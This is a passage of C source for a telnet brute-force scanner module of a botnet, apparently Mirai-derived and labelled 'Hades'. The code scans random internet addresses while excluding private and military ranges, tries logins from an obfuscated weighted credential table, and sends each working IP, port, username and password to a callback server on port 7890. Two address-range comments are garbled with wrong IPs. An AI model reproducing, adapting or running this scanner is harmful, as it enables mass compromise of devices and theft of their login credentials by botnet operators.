                                table_unlock_val(TABLE_SCAN_QUERY);
                                tmp_str = table_retrieve_val(TABLE_SCAN_QUERY, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_QUERY);

                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1)
                            {
#ifdef DEBUG
                                printf("(Hades/scanner) FD%d invalid username/password combo\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;

                                // Retry
                                if (++(conn->tries) == 30)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
                                    setup_connection(conn);
#ifdef DEBUG
                                    printf("(Hades/scanner) FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
#ifdef DEBUG
                                printf("(Hades/scanner) FD%d found verified working telnet\n", conn->fd);
#endif
                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = SC_CLOSED;
                            }
                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    kill(scanner_pid, 9);
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("(Hades/scanner) failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 80.240.27.19/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 180.240.27.19/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp, len;
		char *ogin, *enter;

        table_unlock_val(TABLE_SCAN_OGIN);
		table_unlock_val(TABLE_SCAN_ENTER);

		ogin = table_retrieve_val(TABLE_SCAN_OGIN, &len);
		enter = table_retrieve_val(TABLE_SCAN_ENTER, &len);

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, ogin, len - 1) != -1))
            prompt_ending = tmp;

        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, enter, len - 1) != -1))
            prompt_ending = tmp;

    }
        table_lock_val(TABLE_SCAN_OGIN);
		table_lock_val(TABLE_SCAN_ENTER);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
		int tmp, len;
		char *assword;

		table_unlock_val(TABLE_SCAN_ASSWORD);

		assword = table_retrieve_val(TABLE_SCAN_ASSWORD, &len);

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, assword, len - 1) != -1))
            prompt_ending = tmp;
    }
		table_lock_val(TABLE_SCAN_ASSWORD);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(TABLE_SCAN_NCORRECT);
    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)
    {
        table_lock_val(TABLE_SCAN_NCORRECT);
        return -1;
    }
    table_lock_val(TABLE_SCAN_NCORRECT);

    table_unlock_val(TABLE_SCAN_RESP);
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
    table_lock_val(TABLE_SCAN_RESP);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;
    struct resolv_entries *entries = NULL;

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("(Hades/scanner/report) failed to call socket()\n");
#endif
        exit(0);
    }

    table_unlock_val(TABLE_SCAN_DOMAIN);

    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_DOMAIN, NULL));
    if (entries == NULL)
    {
#ifdef DEBUG
        printf("(Hades/scanner/report) failed to resolve report address\n");
#endif
        return;
    }
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    addr.sin_port = htons(7890);
    resolv_entries_free(entries);

    table_lock_val(TABLE_SCAN_DOMAIN);

    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
#ifdef DEBUG
        printf("(Hades/scanner/report) failed to connect to scanner callback!\n");
#endif
        close(fd);
        exit(0);
    }

    uint8_t zero = 0;
    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("(Hades/scanner/report) sent scan result to scanlisten\n");
#endif

    close(fd);
    exit(0);
}

static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0xde;
        cpy[i] ^= 0xad;
        cpy[i] ^= 0xda;
        cpy[i] ^= 0xad;
    }

    return cpy;
}

static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}
